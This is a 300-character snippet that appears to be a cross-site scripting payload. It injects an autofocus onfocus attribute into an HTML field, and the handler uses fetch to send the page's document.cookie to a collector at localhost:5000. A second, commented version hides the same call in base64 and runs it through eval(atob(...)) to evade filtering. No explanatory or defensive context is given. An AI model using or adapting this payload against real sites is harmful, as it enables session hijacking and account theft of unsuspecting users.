name"autofocus onfocus=fetch(`http://localhost:5000?payload=${encodeURIComponent(document.cookie)}`) placeholder=
// as base64 (obfuscated):
// name"autofocus onfocus="eval(atob('ZmV0Y2goYGh0dHA6Ly9sb2NhbGhvc3Q6NTAwMD9wYXlsb2FkPSR7ZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmNvb2tpZSl9YCk='))" placeholder=